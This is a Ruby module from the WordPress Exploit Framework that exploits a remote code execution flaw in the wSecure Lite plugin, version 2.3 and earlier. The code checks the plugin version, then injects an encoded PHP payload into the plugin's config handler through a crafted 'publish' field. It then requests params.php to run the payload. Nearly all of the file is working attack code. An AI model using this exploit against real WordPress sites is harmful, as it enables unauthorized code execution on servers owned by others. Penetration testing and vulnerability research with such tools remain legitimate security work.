# frozen_string_literal: true

class Wpxf::Exploit::WsecureLiteShellUpload < Wpxf::Module
  include Wpxf::WordPress::ShellUpload

  def initialize
    super

    update_info(
      name: 'wSecure Lite <= 2.3 Shell Upload',
      author: [
        'White Fir Design', # Disclosure
        'rastating'         # WPXF module
      ],
      references: [
        ['WPVDB', '8594'],
        ['URL', 'https://www.pluginvulnerabilities.com/2016/07/12/remote-code-execution-rce-vulnerability-in-wsecure-lite/']
      ],
      date: 'Aug 02 2016'
    )
  end

  def plugin_url
    normalize_uri(wordpress_url_plugins, 'wsecure')
  end

  def check
    readme = normalize_uri(plugin_url, 'readme.txt')
    check_version_from_custom_file(readme, /Version\s(\d\.\d)\s\-/, '2.4')
  end

  def payload_field_value
    "\";} ?> #{payload.encoded} <?php class #{Utility::Text.rand_alpha(5)} { var $#{Utility::Text.rand_alpha(10)}=\""
  end

  def payload_body_builder
    builder = Wpxf::Utility::BodyBuilder.new
    builder.add_field('wsecure_action', 'update')
    builder.add_field('publish', payload_field_value)
    builder
  end

  def uploader_url
    normalize_uri(plugin_url, 'wsecure-config.php')
  end

  def uploaded_payload_location
    normalize_uri(plugin_url, 'params.php')
  end

  def execute_payload(payload_url)
    # The file handle from the request to wsecure-config.php doesn't seem to close right away
    # so a delay is required before accessing params.php in order to execute the payload.
    sleep(5)
    super(payload_url)
  end
end
